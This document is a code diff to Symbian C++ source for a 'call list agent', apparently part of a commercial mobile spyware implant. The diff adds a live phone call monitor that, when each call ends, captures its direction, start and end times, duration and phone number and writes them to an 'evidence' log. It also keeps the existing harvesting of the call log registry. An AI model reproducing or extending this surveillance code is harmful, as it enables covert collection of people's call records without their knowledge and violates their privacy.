@@ -9,6 +9,9 @@
 #include "LogFile.h"
 #include <HT\TimeUtils.h>
 
+/*
+ * Log format structs and defines
+ */
 #define LOG_VERSION_01 2008121901
 
 #define OUTGOING 		0x00000001;     // 1=out, 0=in or missed
@@ -46,8 +49,11 @@ CAgentCallList::CAgentCallList() : CAbstractAgent(EAgent_CallList)
 CAgentCallList::~CAgentCallList()
 	{
 	__FLOG(_L("Destructor"));
+	
 	delete iCallLogReader;
+	delete iCallMonitor;
 	delete iMarkupFile;
+	
 	__FLOG(_L("End Destructor"));
 	__FLOG_CLOSE;
 	}
@@ -75,6 +81,7 @@ void CAgentCallList::ConstructL(const TDesC8& params)
 		
 	iMarkupFile = CLogFile::NewL(iFs);
 	iCallLogReader = CCallLogReader::NewL(*this,iFs);
+	iCallMonitor = CPhoneCallMonitor::NewL(*this);
 	}
 
 void CAgentCallList::StartAgentCmdL()
@@ -113,6 +120,7 @@ void CAgentCallList::StartAgentCmdL()
 void CAgentCallList::StopAgentCmdL()
 	{
 	__FLOG(_L("StopAgentCmdL()"));
+	iCallMonitor->Cancel();
 	CloseLogL(); 
 	}
 
@@ -144,8 +152,14 @@ void CAgentCallList::CallLogProcessed(TInt aError)
 		iMarkupFile->WriteMarkupL(Type(),buf);
 		}
 	CleanupStack::PopAndDestroy(&buf);
+	
+	// start listening to phone calls
+	iCallMonitor->StartListeningForEvents();
 	}
 
+/*
+ * This is used when we construct evidences from registry log
+ */
 HBufC8* CAgentCallList::GetCallLogBufferL(TInt aDirection, const CLogEvent& aEvent)
 	{
 	CBufBase* buffer = CBufFlat::NewL(50);
@@ -220,6 +234,76 @@ HBufC8* CAgentCallList::GetCallLogBufferL(TInt aDirection, const CLogEvent& aEve
 	return result;
 	}
 
+/*
+ * This is used when we construct evidences from phone calls
+ */
+HBufC8* CAgentCallList::GetCallLogBufferL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration,const TDesC& aNumber)
+	{
+	CBufBase* buffer = CBufFlat::NewL(50);
+	CleanupStack::PushL(buffer);
+	
+	TCallListHeader callHeader;
+	
+	// set time
+	TTime endTTime(aStartTime.Int64());
+	endTTime += aDuration;
+	TInt64 startTime = TimeUtils::GetFiletime(aStartTime);
+	TInt64 endTime = TimeUtils::GetFiletime(endTTime);
+	callHeader.iStartCall.dwHighDateTime = (startTime >> 32);
+	callHeader.iStartCall.dwLowDateTime = (startTime & 0xFFFFFFFF);
+	callHeader.iEndCall.dwHighDateTime = (endTime >> 32);
+	callHeader.iEndCall.dwLowDateTime = (endTime & 0xFFFFFFFF);
+	
+	// set flags
+	if(aDirection == CTelephony::EMobileTerminated)
+		{
+		if(aDuration.Int() == 0)
+			{
+			//missed call
+			callHeader.iFlags = 0;
+			}
+		else
+			{
+			callHeader.iFlags |= ANSWERED;
+			}
+		}
+	else if (aDirection == CTelephony::EMobileOriginated)
+		{
+		callHeader.iFlags |= OUTGOING;
+		if(aDuration.Int() > 0)
+			{
+			callHeader.iFlags |= ANSWERED;
+			}
+		}
+	
+	TInt size;
+	TUint8* ptrData;
+	TUint32 typeAndLen;
+	// optional data
+	// telephone number
+	size = aNumber.Size();
+	if(size !=0)
+		{
+		ptrData = (TUint8 *)aNumber.Ptr();
+		typeAndLen = NUMBER;
+		typeAndLen += size;
+		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
+		buffer->InsertL(buffer->Size(), ptrData, size);
+		}
+	// name into contacts
+	// this can be done only looking into contacts given the phone number... too much burden!
+	
+	// insert header
+	callHeader.uSize = sizeof(callHeader) + buffer->Size();
+	buffer->InsertL(0, &callHeader, sizeof(callHeader));
+		
+	HBufC8* result = buffer->Ptr(0).AllocL();
+		
+	CleanupStack::PopAndDestroy(buffer);
+		
+	return result;
+	}
+
 HBufC8* CAgentCallList::GetTTimeBufferL(const TTime aTime)
 {
 	TInt64 timestamp = aTime.Int64();
@@ -234,3 +318,38 @@ HBufC8* CAgentCallList::GetTTimeBufferL(const TTime aTime)
 	CleanupStack::PopAndDestroy(buffer);
 	return result;
 }
+
+void CAgentCallList::NotifyConnectedCallStatusL(CTelephony::TCallDirection aDirection,const TDesC& aNumber)
+	{
+	// we are not interested  in this
+	}
+
+void CAgentCallList::NotifyDisconnectedCallStatusL()
+	{
+	// we are not interested in this
+	}
+
+
+void CAgentCallList::NotifyDisconnectingCallStatusL(CTelephony::TCallDirection aDirection, TTime aStartTime, TTimeIntervalSeconds aDuration, const TDesC& aNumber)
+	{
+	HBufC8* buf = GetCallLogBufferL(aDirection, aStartTime, aDuration, aNumber);
+	if (buf->Length() > 0)
+		{
+		// dump the buffer to the file log. 
+		AppendLogL(*buf);
+		}
+	delete buf;
+	if(iMarkupFile->ExistsMarkupL(Type()))
+		{
+		// if a markup exists, a dump has been performed and this 
+		// is the most recent change
+		RBuf8 buffer(GetTTimeBufferL(aStartTime));
+		buffer.CleanupClosePushL();
+		if (buffer.Length() > 0)
+			{
+			iMarkupFile->WriteMarkupL(Type(),buffer);
+			}
+		CleanupStack::PopAndDestroy(&buffer);
+		}
+	}
+    
